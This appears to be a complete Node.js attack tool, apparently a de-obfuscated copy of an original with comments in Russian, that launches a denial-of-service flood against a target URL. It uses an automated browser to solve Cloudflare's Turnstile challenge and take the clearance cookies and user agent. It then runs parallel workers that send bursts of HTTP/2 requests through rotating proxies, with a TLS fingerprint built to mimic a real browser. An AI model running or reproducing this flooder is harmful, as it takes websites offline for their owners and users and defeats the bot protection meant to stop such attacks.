const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

// Настройка шифров и TLS (расшифровано из оригинального файла)
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(1)].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 | 
    crypto.constants.SSL_OP_NO_SSLv3 | 
    crypto.constants.SSL_OP_NO_TLSv1 | 
    crypto.constants.SSL_OP_NO_TLSv1_1 | 
    crypto.constants.ALPN_ENABLED | 
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | 
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | 
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | 
    crypto.constants.SSL_OP_COOKIE_EXCHANGE | 
    crypto.constants.SSL_OP_PKCS1_CHECK_1 | 
    crypto.constants.SSL_OP_PKCS1_CHECK_2 | 
    crypto.constants.SSL_OP_SINGLE_DH_USE | 
    crypto.constants.SSL_OP_SINGLE_ECDH_USE | 
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(":"),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_method"
});

// Заголовки (расшифровано)
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const cache_header = [
    "no-cache",
    "max-age=0",
    "no-cache, no-store, must-revalidate",
    "no-store",
    "no-cache, no-store, private, max-age=0"
];

const language_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-GB,en;q=0.9"
];

// Проверка аргументов
if (process.argv.length < 8) {
    console.log("\x1b[31mИспользование: node cfchallenge.js <URL> <TIME> <RATE> <THREADS> <COOKIES_COUNT> <PROXIES.TXT>\x1b[0m");
    console.log("\x1b[33mПример: node cfchallenge.js https://example.com 60 5 4 6 proxies.txt\x1b[0m");
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const cookieCount = parseInt(process.argv[6]);
const proxyFile = process.argv[7];

const proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

if (cluster.isMaster) {
    console.log(`[MASTER] Запуск атаки на ${target}...`);
    
    // Логика получения куки через puppeteer-real-browser
    async function prepareBypass() {
        try {
            const response = await connect({
                args: ["--no-sandbox", "--disable-setuid-sandbox"],
                turnstile: true,
                headless: 'new'
            });

            const { page, browser } = response;
            await page.goto(target, { waitUntil: "networkidle2" });
            
            // Ждем решения капчи/челленджа
            await new Promise(r => setTimeout(r, 5000));

            const cookies = await page.cookies();
            const userAgent = await page.evaluate(() => navigator.userAgent);
            const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join("; ");

            console.log(`[INFO] Получен User-Agent: ${userAgent}`);
            
            // Запуск воркеров
            for (let i = 0; i < threads; i++) {
                cluster.fork({
                    BYPASS_COOKIES: cookieStr,
                    BYPASS_UA: userAgent
                });
            }

            await browser.close();
        } catch (err) {
            console.error(`[ERROR] Ошибка подготовки: ${err.message}`);
            process.exit(1);
        }
    }

    prepareBypass();
    setTimeout(() => process.exit(0), time * 1000);

} else {
    // Логика воркера
    const cookies = process.env.BYPASS_COOKIES;
    const ua = process.env.BYPASS_UA;

    function runFlooder() {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const [proxyHost, proxyPort] = proxy.split(':');

        const requestHeaders = {
            ":path": url.parse(target).path,
            ":method": "GET",
            ":authority": url.parse(target).host,
            ":scheme": "https",
            "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
            "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
            "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
            "user-agent": ua,
            "cookie": cookies,
            "upgrade-insecure-requests": "1"
        };

        const agent = tls.connect({
            host: proxyHost,
            port: proxyPort,
            rejectUnauthorized: false,
            secureContext: secureContext,
            servername: url.parse(target).host
        }, () => {
            const client = http2.connect(target, {
                createConnection: () => agent
            });

            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    const req = client.request(requestHeaders);
                    req.end();
                    req.on('response', () => {
                        req.close();
                    });
                }
            });

            client.on('error', () => {
                client.destroy();
                agent.destroy();
            });
        });
    }

    setInterval(runFlooder, 1000);
          }
